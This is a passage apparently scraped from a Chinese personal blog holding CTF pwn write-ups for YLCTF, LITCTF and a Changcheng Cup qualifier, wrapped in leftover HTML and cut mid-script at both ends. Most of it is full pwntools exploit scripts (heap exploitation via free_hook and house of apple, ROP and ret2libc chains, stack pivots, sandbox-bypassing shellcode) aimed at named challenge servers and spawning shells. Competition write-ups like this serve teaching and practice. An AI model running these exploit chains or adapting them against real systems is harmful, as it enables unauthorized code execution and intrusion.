    io.sendlineafter(menu,str(2))
    io.sendlineafter(&amp;quot;Index :&amp;quot;,str(idx))

def edit(addr):
    io.sendlineafter(menu,str(3))
    io.sendafter(&amp;quot;content :&amp;quot;,addr)

def show(idx):
    io.sendlineafter(menu,str(4))
    io.sendlineafter(&amp;quot;Index :&amp;quot;,str(idx))

add(0x500,b&#39;a&#39;) 
add(0x500,b&#39;/bin/sh\x00&#39;) 
add(0x500,b&#39;a&#39;) 
add(0x500,b&#39;a&#39;) 
add(0x100,b&#39;a&#39;) 
delete(2)
add(0x500,b&#39;a&#39;*8) 
show(5)
io.recvuntil(b&#39;a&#39;*8)
libcbase=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x1ecbe0
print(hex(libcbase))
free_hook= libcbase +libc.sym[&#39;__free_hook&#39;]
system=libcbase+libc.sym[&#39;system&#39;]
#gdb.attach(io)
mp=libcbase+0x1EC280+0x50
print(hex(free_hook))
edit(p64(mp))
delete(3)
delete(0)
add(0x500,p64(0)*13+p64(free_hook)) 
#gdb.attach(io)
add(0x500,p64(system))

delete(1)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;round-1-ezorw&#34;&gt;[Round 1] ezorw&lt;/h2&gt;
&lt;p&gt;就是开了沙盒的shellcode&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1729872756053.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
随便绕一下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./pwn&amp;quot;)
elf = ELF(&amp;quot;./pwn&amp;quot;)
libc = elf.libc

payload = asm(shellcraft.openat(0xffffff9c,b&amp;quot;flag&amp;quot;,0))	
#payload = asm(shellcraft.openat(-100,b&amp;quot;flag&amp;quot;,0))	
#-100 AT_FDCWD 表示当前目录
payload += asm(shellcraft.pread(3,0x114514000,0x100,0))	
payload += asm(shellcraft.sendfile(1,3,0,0x100))

p.sendafter(&amp;quot;welcome to YLCTF orw~\n&amp;quot;,payload)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;round-1-ezstack&#34;&gt;[Round 1] ezstack&lt;/h2&gt;
&lt;p&gt;通过栈溢出可以使程序运行到vuln函数，对system函数的命令禁用了s,h,c,f字符，直接/???/?at *lag能拿到flag&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
p = process(&amp;quot;./pwn&amp;quot;)
#gdb.attach(p)
vuln = 0x00000000040127A
p.sendafter(&amp;quot;good stack\n&amp;quot;,b&#39;a&#39;*0x30 + p64(0) + p64(vuln))
p.sendafter(&amp;quot;input your command\n&amp;quot;,b&amp;quot;/???/?at *lag&amp;quot;)
p.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;round-1-giaopwn&#34;&gt;&lt;strong&gt;[Round 1] giaopwn&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;签到&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
p = process(&amp;quot;./pwn&amp;quot;)
#gdb.attach(p)
system = 0x0000000004006D2
cmd = 0x000000000601048
rdi = 0x0000000000400743
ret = rdi + 1
p.sendafter(&amp;quot;welcome to YLCTF\n&amp;quot;,b&#39;a&#39;*32 + p64(0) + p64(rdi) + p64(cmd) + p64(system))

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;round-1-msg_bot&#34;&gt;&lt;strong&gt;[Round 1] msg_bot&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;打开程序发现是一道protobuf的pwn题，手动分析出proto文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;syntax=&amp;quot;proto3&amp;quot;; //proto version 2 or 3

message msgbot{
    int64 msgid = 1;
    int64 msgsize = 2;
    bytes msgcontent = 3;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;利用&lt;code&gt;protoc bot.proto --python_out=./&lt;/code&gt;命令生成python语言的代码，得到一个python文件，可以在exp中导入，构建相应的protobuf包，分析程序发现如果要想执行到shellcode，需要满足msgid=3235839725，msgsize=4027448014，通过调试发现输入的shellcode每个字节需要在0x1f和0x7f之间，都需要是可见字符，而且还限制了shellcode的长度，但是长度放的非常多，不用怎么管，直接用alpha3生成即可，构造一个shellcode的再次读入，后面读入的shellcode的限制就没有了，但是程序还开了沙盒&lt;img src=&#34;C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1728627907038.png&#34; alt=&#34;1728627907038&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;没办法使用打开文件的操作，但是允许了一个fstat的函数，可以知道是要利用retfq把程序转化为32位系统，此时的open函数的系统调用号就是5，就可以打开文件了，然后再转化到64位系统调用read和write函数即可打印出flag，具体转化的细节慢慢调试就可以&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
import bot_pb2
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
# p = process(&amp;quot;./msg_bot&amp;quot;)
p = remote(&amp;quot;challenge.yuanloo.com&amp;quot;,29472)
elf = ELF(&amp;quot;./msg_bot&amp;quot;)

# re_read
# from pwn import *

# payload = shellcraft.amd64.read(0, &amp;quot;rdi&amp;quot;, 0x6666)
# f = open(&#39;mmap_read&#39;, &#39;wb&#39;)
# f.write(asm(payload, arch = &#39;amd64&#39;, os = &#39;linux&#39;))
# f.close()

data = bot_pb2.msgbot()
data.msgid = 3235839725
data.msgsize = 4027448014
data.msgcontent = b&#39;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M1L3a144z5o108K15380S3E0W0V070N01&#39;
data = data.SerializeToString()
# gdb.attach(p,&amp;quot;b *$rebase(0x0000000000017C9)&amp;quot;)
p.sendafter(&amp;quot;botmsg: &amp;quot;,data)

re_read = asm(&#39;&#39;&#39;
              push 0x23
              add rcx,5
              push rcx
              retfq
              mov rsp,rcx
&#39;&#39;&#39;)

# sc = shellcraft.i386.open(&amp;quot;/flag&amp;quot;)
sc = b&#39;h\x01\x01\x01\x01\x814$`f\x01\x01h./fl\xb8\x05\x00\x00\x00\x89\xe31\xc9\xcd\x80&#39;
re_read += sc

re_read1 = asm(&#39;&#39;&#39;
               push 0x33
               add rsi,0x7a
               push rsi
               retfq
               mov rsp,rbx
&#39;&#39;&#39;)
re_read += re_read1

rw = shellcraft.amd64.read(0x3, &amp;quot;rbx&amp;quot;, 0x40)
rw += shellcraft.amd64.write(0x1, &amp;quot;rbx&amp;quot;, 0x40)
rw = asm(rw)
re_read += rw
pause()

p.send(b&#39;a&#39;*0x49 + re_read)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;round-2&#34;&gt;Round 2&lt;/h1&gt;
&lt;h2 id=&#34;round-2-canary&#34;&gt;[Round 2] canary&lt;/h2&gt;
&lt;p&gt;选项二可以直接改rbp和ret指令，可以跳过canary，把栈控制到bss段上，然后留下一个要跳入的地址到bss里，留下的方法就是把地址放在rbp的位置上，如果放到ret指令处，那么在程序执行过程中就会改变，然后把rbp迁到stack_chk_fail的got表上方，把stack_chk_fail的got表改为leave ret，然后借助留在bss的地址跳到gift函数，后面面就是常规的ret2libc&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import LibcSearcher
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)

# p = process(&#39;./pwn&#39;)
p = remote(&#39;challenge.yuanloo.com&#39;,33016)
# elf = ELF(&#39;./pwn&#39;)
bss = 0x000000000404060 + 0x900
got1 = 0x000000000404020
got = 0x000000000404028
main = 0x000000000401296
choice_1 = 0x000000000401258
choice_2 = 0x00000000040133F
leave = 0x0000000000401288

p.sendlineafter(&amp;quot;Do you want to enter other functions?\n&amp;quot;, b&#39;2&#39;)
payload = p64(bss - 0x10) + p64(main)
p.send(payload)
p.sendlineafter(&amp;quot;Do you want to enter other functions?\n&amp;quot;, b&#39;2&#39;)
pay = p64(bss + 0x20) + p64(main)
p.send(pay)
p.sendlineafter(&amp;quot;Do you want to enter other functions?\n&amp;quot;, b&#39;2&#39;)
pay = p64(0x000000000401241) + p64(0x00000000040128F)
p.send(pay)
# gdb.attach(p)
p.sendlineafter(&amp;quot;Do you want to enter other functions?\n&amp;quot;, b&#39;2&#39;)
pay = p64(got) + p64(choice_2)
p.send(pay)
pay = p64(0x404978) + p64(leave)
p.send(pay)


puts_plt = 0x0000000004010A0
puts_got = 0x000000000404018
main_addr = 0x000000000401258
pop_rdi_ret = 0x00000000004013e3
ret = pop_rdi_ret + 1

#gdb.attach(p)

payload = b&#39;a&#39;*64 + p64(bss) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.send(payload)

puts_addr=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
print(hex(puts_addr))

libc_base = puts_addr - 0x000000000084420
system_addr = libc_base + 0x000000000052290
bin_addr = libc_base + 0x0000000001B45BD
onegadget = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
one_gadget = libc_base + onegadget[5]#3 4 

print(&amp;quot;base = &amp;quot;,hex(libc_base))
print(&amp;quot;sys = &amp;quot;,hex(system_addr))
print(&amp;quot;bin = &amp;quot;,hex(bin_addr))

#gdb.attach(p)
#pause()
pay = b&#39;b&#39;*64 + p64(bss) + p64(ret) + p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)
p.send(pay)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;round-2-futureheap&#34;&gt;[Round 2] futureheap&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1729872807789.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
先看init函数，发现有伪随机、可执行段、一堆异或和一个沙盒，沙盒是禁用了execve、open和write，直接openat、sendfile绕过即可，有mmap为7的段得知打shellcode，这里注意直接把随机数种子布置为time(0)产生的随机数不太一样，随机数前两位题目已经给出，爆破随机数种子即可，然后就可以根据异或得到libc基地址和mmap申请的地址了，然后看主逻辑&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1729872958655.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;如注释所示，还存在uaf漏洞，大小有限制，整个程序的while部分无回显，也无法泄露堆地址，可以利用house of apple，利用一次largebin attack劫持io结构体，把 wide_data 劫持到mmap申请的地址，因为堆地址不知道，mmap的地址知道并且可写，然后在mmap的地址里写入伪造的wide_data ，后面写上shellcode，劫持程序执行写入的shellcode即可&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
import ctypes

context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)
# io = process(&#39;./pwn&#39;)
io = remote(&amp;quot;challenge.yuanloo.com&amp;quot;,25509)
e = ELF(&#39;./pwn&#39;)
libc = e.libc

def dbg():
    gdb.attach(io)


def cmd(choice):
    io.sendline(str(choice).encode())

# 大小在0x90-0x1000
# 32个
def add(idx,size):
    cmd(1)
    sleep(0.5)
    io.sendline(str(idx).encode())
    sleep(0.5)
    io.sendline(str(size).encode())

def edit(idx,payload):
    cmd(2)
    sleep(0.5)
    io.sendline(str(idx).encode())
    sleep(0.5)
    io.sendline(payload)

def delete(idx):
    cmd(3)
    sleep(0.5)
    io.sendline(str(idx).encode())
    
def shellcode(payload):
    cmd(4)
    sleep(0.5)
    io.sendline(b&#39;74r0t#C@rd&#39;)
    sleep(0.5)
    # pause()
    io.sendline(payload)

def exit():
    cmd(5)


# gdb.attach(io,&amp;quot;b *$rebase(0x0000000000019FF)&amp;quot;)
lib = ctypes.CDLL(&#39;./1.so&#39;)

lib.random_number.restype = ctypes.c_int

io.sendlineafter(&amp;quot;Tell me your name, my dear: \n&amp;quot;,b&amp;quot;aaaaaaaa&amp;quot;)

io.recvuntil(&amp;quot;Wolf is &amp;quot;)
wolf = int(io.recvuntil(&amp;quot;.\n&amp;quot;, drop = True))
print(wolf)

io.recvuntil(&amp;quot;Sword is &amp;quot;)
Sword = int(io.recvuntil(&amp;quot;.\n&amp;quot;, drop = True))
print(Sword)

io.recvuntil(&amp;quot;Lion is &amp;quot;)
Lion = int(io.recvuntil(&amp;quot;.\n&amp;quot;, drop = True))
print(Lion)

io.recvuntil(&amp;quot;Snake is &amp;quot;)
Snake = int(io.recvuntil(&amp;quot;.\n&amp;quot;, drop = True))
print(Snake)

seed = lib.set_seed(wolf,Sword)
random1 = lib.random_number(seed)
print(&amp;quot;random1 = &amp;quot;,random1)
random2 = lib.random_number1(seed)
print(&amp;quot;random2 = &amp;quot;,random2)
random3 = lib.random_number2(seed)
print(&amp;quot;random3 = &amp;quot;,random3)
random4 = lib.random_number3(seed)
print(&amp;quot;random4 = &amp;quot;,random4)

setvbuf = wolf ^ random3 ^ Lion
print(&amp;quot;setvbuf = &amp;quot;,hex(setvbuf))
libcbase = setvbuf - 0x0815f0
print(&amp;quot;libcbase = &amp;quot;,hex(libcbase))
fortune = Sword ^ random4 ^ Snake
print(&amp;quot;fortune = &amp;quot;,hex(fortune))

_IO_list_all = libcbase + libc.sym[&#39;_IO_list_all&#39;]
io_wfile_jumps = libcbase + libc.sym[&#39;_IO_wfile_jumps&#39;]

add(0, 0x528)
add(1, 0x528)
add(2, 0x518)
delete(0)
add(3, 0x620)
edit(0, p64(0) + p64(0) + p64(0) + p64(_IO_list_all - 0x20))
delete(2)
# gdb.attach(io)
add(4, 0x620)

payload = b&#39;\x00&#39;*0xe0 + p64(fortune + 0x200)
payload += asm(shellcraft.openat(0xffffff9c,b&amp;quot;flag&amp;quot;,0))	
payload += asm(shellcraft.pread(3,fortune + 0x400,0x100,0))	
payload += asm(shellcraft.sendfile(1,3,0,0x100))
payload = payload.ljust(0x200,b&#39;\x00&#39;)
payload += b&#39;\x00&#39;*0x68 + p64(fortune + 0xe8)

shellcode(payload)
fake_io_file = p64(0)*2 + p64(1) + p64(2)
fake_io_file = fake_io_file.ljust(
    0xa0 - 0x10, b&#39;\0&#39;) + p64(fortune)  # _wide_data (A)
fake_io_file = fake_io_file.ljust(
    0xc0 - 0x10, b&#39;\0&#39;) + p64(0xffffffffffffffff)  # _mode
fake_io_file = fake_io_file.ljust(
    0xd8 - 0x10, b&#39;\0&#39;) + p64(io_wfile_jumps)  # vtable

cmd(2)
sleep(0.5)
io.sendline(b&#39;2&#39;)
sleep(0.5)
io.sendline(fake_io_file)
sleep(0.5)
io.sendline(b&#39;4&#39;)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;round-2-magicread&#34;&gt;[Round 2] magicread&lt;/h2&gt;
&lt;p&gt;查看程序只有一个read且溢出了0x10个字节，打栈迁移，迁移两次，一次泄露libc地址一次得到shell，由于需要再次read所以直接利用main函数&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

# p = process(&amp;quot;./pwn&amp;quot;)
p = remote(&amp;quot;challenge.yuanloo.com&amp;quot;,21148)
#elf = ELF(&amp;quot;./pwn&amp;quot;)

rdi = 0x0000000000400723
rsi_r15 = 0x0000000000400721
rbp = 0x0000000000400578
bss = 0x00000000601040 + 0x500
puts = 0x0000000004004E0
got = 0x000000000601018
leave = 0x0000000000400691

# gdb.attach(p)

payload = b&#39;a&#39;*0x40 + p64(bss + 0x100) + p64(0x000000000400675)
p.sendafter(&amp;quot;just read!\n&amp;quot;,payload)

pay = p64(rdi) + p64(got) + p64(puts) + p64(rbp) + p64(bss+0x300+0x100) + p64(0x000000000400675)
pay = pay.ljust(0x40,b&#39;\x00&#39;) + p64(0x601600 - 8) + p64(leave)
p.send(pay)
read_addr = u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
print(hex(read_addr))
libc_base = read_addr - 0x00000000006F6A0
print(hex(libc_base))

#onegadget = [0xe3afe,0xe3b01,0xe3b04]
#one_gadget = libc_base + onegadget[0]

system = libc_base + 0x0000000000453A0
bin_sh = libc_base + 0x00000000018CE57
pay3 =(b&#39;a&#39;*8 + p64(rdi) + p64(bin_sh) + p64(rdi+1) + p64(system)).ljust(0x40,b&#39;\x00&#39;)
pay3 += p64(0x601900) + p64(leave)
p.send(pay3)
pause()
p.sendline(b&amp;quot;cat flag&amp;quot;)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;round-2-ezstack2&#34;&gt;&lt;strong&gt;[Round 2] ezstack2&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;ret2libc&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&#39;./pwn&#39;)
p = remote(&amp;quot;challenge.yuanloo.com&amp;quot;,39989)
#elf = ELF(&#39;./pwn&#39;)

puts_plt = 0x000000000400580
puts_got = 0x000000000601018
main_addr = 0x000000000400739
pop_rdi_ret = 0x0000000000400823
ret = 0x000000000040056e
bss = 0x000000000601060 + 0x700
#gdb.attach(p)

payload = b&#39;a&#39;*0x30 + p64(bss) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter(&amp;quot;good stack\n&amp;quot;,payload)

puts_addr=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
print(hex(puts_addr))

libc_base = puts_addr - 0x84420
system_addr = libc_base + 0x52290
bin_addr = libc_base + 0x1b45bd
onegadget = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
one_gadget = libc_base + onegadget[5]#3 4 

print(&amp;quot;base = &amp;quot;,hex(libc_base))
print(&amp;quot;sys = &amp;quot;,hex(system_addr))
print(&amp;quot;bin = &amp;quot;,hex(bin_addr))

# gdb.attach(p)

pause()
pay = b&#39;a&#39;*0x30 + p64(0x404220) + p64(ret) + p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)
p.send(pay)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;round-2-shortshell&#34;&gt;&lt;strong&gt;[Round 2] shortshell&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;读入五个字节的shellcode，存在后门函数，让程序跳到后门函数即可，基地址好像不一样，调整一下偏移即可&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)
p = remote(&amp;quot;challenge.yuanloo.com&amp;quot;,43268)
#p = process(&amp;quot;./pwn&amp;quot;)

#gdb.attach(p)
payload = b&amp;quot;\xE9\x02\xd2\xff\xff&amp;quot;
p.sendafter(&amp;quot;Welcome to YLCTF-PWN\n&amp;quot;, payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;round-3&#34;&gt;Round 3&lt;/h1&gt;
&lt;h2 id=&#34;round-3-secret&#34;&gt;[Round 3] Secret&lt;/h2&gt;
&lt;p&gt;nc后输入”SuperSecretPassword\n“即得flag&lt;/p&gt;
&lt;h2 id=&#34;round-3-ezstack3&#34;&gt;[Round 3] ezstack3&lt;/h2&gt;
&lt;p&gt;32位，没开PIE，有system函数&lt;img src=&#34;https://l1u66.github.io//post-images/1729873036427.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;第一次read用来泄露栈地址，在栈上写入/bin/sh即可知道其地址，第二次read构造ROP链就行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;i386&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

flag=1
if flag==1:
	p = process(&amp;quot;./pwn&amp;quot;)
else:
	p = remote(&amp;quot;challenge.yuanloo.com&amp;quot;,30305)

bss = 0x804C02C
pay = b&#39;a&#39;*48
p.sendafter(&amp;quot;Welcome to YLCTF stack3&amp;quot;,pay)
p.recv(48)
stack = u32(p.recv(4))
print(&amp;quot;stack = &amp;quot;,hex(stack))

edi_ebp = 0x080493c2
sys = 0x80490C0
sh = stack - 52
leave = 0x08049185
ret = 0x0804900e

payload =  p32(sys) + p32(bss+0x500) + p32(sh) + b&#39;/bin/sh\x00&#39;
payload = payload.ljust(48)
payload += p32(stack - 68) + p32(leave)
gdb.attach(p)

p.send(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;round-3-null&#34;&gt;[Round 3] null&lt;/h2&gt;
&lt;p&gt;2.27版本的off by null，构造unlink实现堆覆盖之后劫持free_hook为onegadget即可&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
# io = process(&#39;./pwn&#39;)
io = remote(&amp;quot;challenge.yuanloo.com&amp;quot;,29653)
e = ELF(&#39;./pwn&#39;)
libc = e.libc
one = [0xe6aee, 0xe6af1, 0xe6af4]


def dbg():
    gdb.attach(io)


def cmd(choice):
    io.recvuntil(b&#39;:&#39;)
    io.sendline(str(choice).encode())

# 大小在0x90-0x1000
# 32个
def add(idx,size):
    cmd(1)
    io.recvuntil(b&#39;Index: &#39;)
    io.sendline(str(idx).encode())
    io.recvuntil(b&#39;Size &#39;)
    io.sendline(str(size).encode())


def delete(idx):
    cmd(4)
    io.recvuntil(b&#39;Index: &#39;)
    io.sendline(str(idx).encode())


def show(idx):
    cmd(3)
    io.recvuntil(b&#39;Index: &#39;)
    io.sendline(str(idx).encode())


def edit(idx,content=b&#39;deafbeef&#39;):
    cmd(2)
    io.recvuntil(b&#39;Index: &#39;)
    io.sendline(str(idx).encode())
    io.recvuntil(b&#39;Content: &#39;)
    io.sendline(content)

add(0,0xf8)#0
add(1,0xf8)#1
add(2,0xf8)#2
add(3,0xf8)#3
for i in range(20,27):
    add(i,0xf8)
for i in range(20,27):
    delete(i)
pay = b&#39;a&#39;*0xf0 + p64(0x200)
delete(0)
edit(1,pay)
delete(2)
for i in range(20,27):
    add(i,0xf8)
add(31,0xf8)
show(31)
io.recvuntil(b&#39;Content: &#39;)
libc_base = u64(io.recv(6).ljust(8,b&#39;\x00&#39;)) - 4112272
print(&amp;quot;libc_base = &amp;quot;,hex(libc_base))
free_hook = libc_base + libc.sym[&#39;__free_hook&#39;] 
one = [0x4f29e,0x4f2a5,0x4f302,0x10a2fc]

add(30,0xf8)
delete(3)
delete(30)
edit(1,p64(free_hook))
add(11,0xf8)
add(12,0xf8)
edit(12,p64(libc_base + one[2]))
# gdb.attach(io)
delete(11)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">源鲁杯2024</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/litctfguo-wai/"" data-c="
          &lt;p&gt;补个wp&lt;br&gt;
主要是一道没有任何输出的read的开了沙盒的栈溢出，利用原理：先在bss段读取需要执行的rop链，然后将read的got表改一个字节成syscall，程序正常退出会有一个eax置零然后leave out的操作，详细看exp&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)


# p = process(&#39;./main&#39;)
p = remote(&amp;quot;litctf.org&amp;quot;,31771)
elf = ELF(&#39;./main&#39;)
libc = elf.libc

bss = 0x000000000404000 + 0x700
pop_rdi = 0x00000000004013d3
pop_rsi_r15 = 0x00000000004013d1
read_got = 0x000000000404030
read_plt = 0x0000000004010A0
rax_0_leave_ret = 0x0000000000401364
payload = b&#39;a&#39;*32 + p64(bss) + p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(read_plt)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0) + p64(read_plt)
payload += p64(pop_rdi) + p64(1) + p64(read_plt)
payload += p64(rax_0_leave_ret) 
p.send(payload)

# gdb.attach(p)

pause()
pay = p64(bss + 0x100) + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(0x404718) + p64(0) + p64(read_plt)
p.send(pay)

pause()
pay = p8(0xf0)
p.send(pay)
libc_base = u64(p.recv(6).ljust(8,b&#39;\x00&#39;)) - 0x00000000010E1F0
print(&amp;quot;libc_base = &amp;quot;,hex(libc_base))

pop_rax = 0x0000000000036174 + libc_base
pop_rdx_r12 = 0x0000000000119431 + libc_base
#close
rop = b&amp;quot;./flag.txt&amp;quot;
rop = rop.ljust(0x10,b&#39;\x00&#39;)
rop+=p64(pop_rdi)
rop+=p64(0)
rop+=p64(pop_rax)
rop+=p64(3)
rop+=p64(read_plt)

#open
rop+=p64(pop_rdi)
rop+=p64(0x404718)# &#39;flag&#39; address
rop+=p64(pop_rsi_r15)
rop+=p64(0)
rop+=p64(0)
rop+=p64(pop_rax)
rop+=p64(2)
rop+=p64(read_plt)

#read
rop+=p64(pop_rdi)
rop+=p64(0)
rop+=p64(pop_rsi_r15)
rop+=p64(bss - 0x400)# flag store address
rop+=p64(0)
rop+=p64(pop_rax)
rop+=p64(0)
rop+=p64(read_plt)

#write
rop+=p64(pop_rdi)
rop+=p64(1)
rop+=p64(pop_rsi_r15)
rop+=p64(bss - 0x400)# flag store address
rop+=p64(0)
rop+=p64(pop_rax)
rop+=p64(1)
rop+=p64(read_plt)
pause()
p.send(rop)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">litctf（国外）</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/di-si-jie-chang-cheng-bei-wang-luo-an-quan-da-sai-ji-jing-jin-ji-wang-luo-an-quan-ji-neng-jing-sai-chu-sai/"" data-c="
          &lt;p&gt;就差一名进决赛，Kylin_Heap签到堆题本地通了，远端偏移有点问题没整出来，刚出以为是前面那道内核题演化出来的内核堆就没看，后面没时间了，诶，这道出来必进决赛啊，我是队伍罪人😭😭😭&lt;/p&gt;
&lt;h1 id=&#34;flowershop&#34;&gt;FlowerShop&lt;/h1&gt;
&lt;p&gt;有个栈溢出检测可以直接绕过，然后修改钱数买magic提供/bin/sh字符串，shop函数中有个check函数，如果买了两个a，一个b还有一个栈溢出，题目给了system函数，可以直接拿到shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
p = remote(&amp;quot;8.147.131.74&amp;quot;,27260)
# p = process(&amp;quot;./pwn1&amp;quot;)
rdi = 0x0000000000400f13
ret = 0x00000000004006f6

pay = b&#39;a&#39;*52 + b&#39;pwn&#39; + b&#39;\x00&#39; + p64(0x1234)
p.sendlineafter(&amp;quot;请输入你的姓名:\n&amp;quot;,pay)
p.sendlineafter(&amp;quot;请输入你的选项:\n&amp;quot;,b&#39;a&#39;)
p.sendlineafter(&amp;quot;请输入购买的商品序号:\n&amp;quot;,b&#39;a&#39;)
p.sendlineafter(&amp;quot;你想要继续买花吗? 1/0\n&amp;quot;,b&#39;1&#39;)
p.sendlineafter(&amp;quot;请输入购买的商品序号:\n&amp;quot;,b&#39;a&#39;)
p.sendlineafter(&amp;quot;你想要继续买花吗? 1/0\n&amp;quot;,b&#39;1&#39;)
p.sendlineafter(&amp;quot;请输入购买的商品序号:\n&amp;quot;,b&#39;b&#39;)
p.sendlineafter(&amp;quot;你想要继续买花吗? 1/0\n&amp;quot;,b&#39;1&#39;)
# gdb.attach(p)
p.sendlineafter(&amp;quot;请输入购买的商品序号:\n&amp;quot;,b&#39;c&#39;)
payload = b&#39;0&#39;*24 + p64(rdi) + p64(0x000000000601840) + p64(ret) + p64(0x000000000400730)
p.sendlineafter(&amp;quot;你想要继续买花吗? 1/0\n&amp;quot;,payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;kylin_heap&#34;&gt;Kylin_Heap&lt;/h1&gt;
&lt;p&gt;2.31的修改后的libc，libc偏移有些不同，存在edit after free，uaf漏洞，add无限制大小，泄露出libc之后直接修改tcache bin的next指针劫持hook&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
r = process(&#39;./pwn&#39;)
#r = remote(&amp;quot;8.147.134.241&amp;quot;,45324)
e = ELF(&#39;./pwn&#39;)
libc = ELF(&#39;./libc-2.31-0kylin9.2k0.2.so&#39;)  # ubuntu22打本地
#one = [0xe6c7e, 0xe6c81, 0xe6c84]
one = [0xe3afe, 0xe3b01, 0xe3b04]


def dbg():
    gdb.attach(r)


def cmd(choice):
    r.recvuntil(b&#39;What will you do, adventurer? &#39;)
    r.sendline(str(choice).encode())


def add(size, content=b&#39;a&#39;): #从0开始 最多20个堆
    cmd(1)
    r.recvuntil(b&#39;Enter the size of the block you wish to summon (1 to 1280 bytes): &#39;)
    r.sendline(str(size).encode())
    r.recvuntil(b&#39;bytes):\n&#39;)
    r.send(content)


def free(idx):
    cmd(2)
    r.recvuntil(b&#39;Which block will you let go? Enter the index (0-19): &#39;)
